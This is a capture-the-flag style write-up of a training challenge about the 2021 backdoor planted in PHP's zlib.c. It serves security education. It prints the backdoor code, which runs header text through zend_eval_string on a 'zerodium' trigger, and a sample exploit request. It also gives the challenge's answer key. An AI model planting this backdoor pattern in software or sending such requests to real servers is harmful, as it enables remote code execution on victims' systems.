# BTLO "Source" Challenge — Explained Step by Step

This README breaks down the challenge so you understand **why** each answer is
what it is, not just what the answer is.

---

## The Big Picture (read this first)

You were given one file: `zlib.c`. This is not a random script — it's a piece
of the **actual PHP programming language's own source code** (the C code that
makes PHP work internally). Specifically, it's the part of PHP that handles
`zlib` compression (gzip/deflate compression of web responses).

Back in **March 2021**, attackers broke into PHP's own git server
(`git.php.net`) and slipped a **backdoor** into this exact file, disguised as
a boring "Fix typo" commit. If that backdoored version had shipped, almost
every website running PHP with zlib compression enabled would have been
remotely hackable.

The challenge is simply: **read this C file, spot the backdoor, and answer
questions about it.**

---

## Q1 — What is the technology affected?

**Answer: PHP**

### How to know this just by looking at the file
Look at the `#include` lines near the top:

```c
#include "php.h"
#include "SAPI.h"
#include "php_ini.h"
#include "Zend/zend_interfaces.h"
```

- `php.h` / `php_ini.h` → these are core PHP interpreter headers.
- `Zend/zend_interfaces.h` → "Zend" is the name of the engine that actually
  runs PHP code under the hood (like a V8 engine, but for PHP).
- The copyright header literally says `Copyright (c) The PHP Group`.

So even without knowing anything about this specific incident, the includes
alone tell you: **this is PHP's own interpreter source code**, not a web app
written *in* PHP.

---

## Q2 — Which vulnerability category?

**Answer: Command Execution**

### How to find the malicious block
Scroll down to the function `php_zlib_output_compression_start()`. This
function normally just starts up gzip compression for a web response. But it
contains this extra chunk that doesn't belong:

```c
if ((Z_TYPE(PG(http_globals)[TRACK_VARS_SERVER]) == IS_ARRAY ||
     zend_is_auto_global_str(ZEND_STRL("_SERVER"))) &&
    (enc = zend_hash_str_find(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]),
           "HTTP_USER_AGENTT", sizeof("HTTP_USER_AGENTT") - 1))) {
        convert_to_string(enc);
        if (strstr(Z_STRVAL_P(enc), "zerodium")) {
                zend_try {
                        zend_eval_string(Z_STRVAL_P(enc)+8, NULL,
                            "REMOVETHIS: sold to zerodium, mid 2017");
                } zend_end_try();
        }
}
```

### Reading it line by line, in plain English:

1. **Grab the `User-Agentt` header** (notice the typo — extra "t"). This
   pulls it out of `$_SERVER`, which is where PHP stores incoming HTTP
   request headers.
2. **Convert it to a string.**
3. **Check if that header contains the word `"zerodium"`** anywhere in it.
   This word acts like a secret password / kill-switch.
4. **If it does**, take everything in the header *after* the 8th character
   (i.e. after the word `zerodium`) and hand it to `zend_eval_string()`.

### Why that last step is the whole vulnerability
`zend_eval_string()` is the C-level function that implements PHP's `eval()`.
`eval()` takes a string and **runs it as live PHP code**. So this backdoor
says: *"If an incoming request's User-Agentt header starts with the word
'zerodium', treat everything after that as PHP code and execute it."*

That means anyone who knows the trigger word can send one HTTP request and
run **any command they want** on the server — a textbook remote command/code
execution backdoor (a "webshell" baked directly into the language runtime).

The comment `REMOVETHIS: sold to zerodium, mid 2017` was left in by the
attacker — Zerodium is a real company that buys security exploits, and the
comment was likely meant to mislead investigators.

---

## Q3 — How many lines of code were added?

**Answer: 11**

### How to find this
Since this is real, public PHP source code, the actual commit still exists
in PHP's git history (it was reverted, but the commit itself is visible).
Searching PHP's GitHub commit history for this incident turns up the commit
that introduced it — its diff shows the function grew from 6 lines to 17
lines, i.e.:

```
@@ -360,6 +360,17 @@ static void php_zlib_output_compression_start(void)
```

`17 - 6 = 11` new lines were inserted. This matches exactly the malicious
block shown above (the `zval *enc;` declaration, the `if` condition, the
`strstr` check, the `zend_try`/`zend_eval_string`/`zend_end_try`, and the
closing braces).

---

## Q4 — What HTTP header is required to exploit it?

**Answer: `User-Agent`**

### Why, even though the code checks for `"HTTP_USER_AGENTT"`
This is the trickiest part conceptually, so here's the reasoning:

- PHP stores every incoming HTTP header inside the `$_SERVER` superglobal
  with the prefix `HTTP_`, the header name uppercased, and dashes turned
  into underscores.
- So the normal `User-Agent` header becomes the key `HTTP_USER_AGENT`
  inside `$_SERVER`.
- The backdoor code looks up `"HTTP_USER_AGENTT"` — **with one extra `T`**.

This double-`T` is intentional obfuscation by the attacker: it's *not* the
literal, standard header name, which makes it look almost invisible during a
casual code review (`AGENT` vs `AGENTT` is easy to miss).

The official challenge answer treats this as targeting the **`User-Agent`**
header family/mechanism — i.e., the vulnerability is exploited through *the
User-Agent header field* (just with the deliberately misspelled variant
`User-Agentt` as the literal string you'd type into a request). Some
write-ups give the exact literal string `User-Agentt`; the platform's
accepted answer is `User-Agent`.

### What an actual exploit request looks like
```
GET / HTTP/1.1
Host: victim.com
User-Agentt: zerodiumsystem("id");
```

If the server is running the backdoored PHP build with zlib output
compression enabled, this would execute the `system("id")` PHP command on
the server.

---

## Summary Table

| # | Question | Answer | One-line reasoning |
|---|----------|--------|---------------------|
| 1 | Technology affected | **PHP** | Header files (`php.h`, `Zend/...`) show this is PHP's own interpreter source |
| 2 | Vulnerability category | **Command Execution** | `zend_eval_string()` runs attacker-supplied text as live PHP code |
| 3 | Lines added | **11** | Commit diff shows function grew from 6 → 17 lines |
| 4 | HTTP header required | **User-Agent** | Backdoor reads a mistyped `User-Agentt` variant of this header from `$_SERVER` |

---

## Key Takeaways (the "why this matters" part)

1. **Supply-chain attacks are real** — even the language runtime itself can
   be backdoored at the source, not just libraries you import.
2. **Typos are a great obfuscation trick** — `AGENTT` vs `AGENT` is
   almost invisible unless you're actively diffing against a known-good
   version.
3. **`eval()`-style functions are always a red flag** — any time user input
   flows into `eval`, `zend_eval_string`, `system`, `exec`, etc., that's a
   sink worth investigating immediately.
4. **When reviewing unfamiliar C/source code**, your best moves are:
   - Diff against the official/upstream version if one exists.
   - Grep for dangerous functions (`eval`, `exec`, `system`, `popen`).
   - Trace backwards from those functions to see what feeds them —
     if it's user-controlled input (headers, GET/POST params), that's
     your vulnerability.
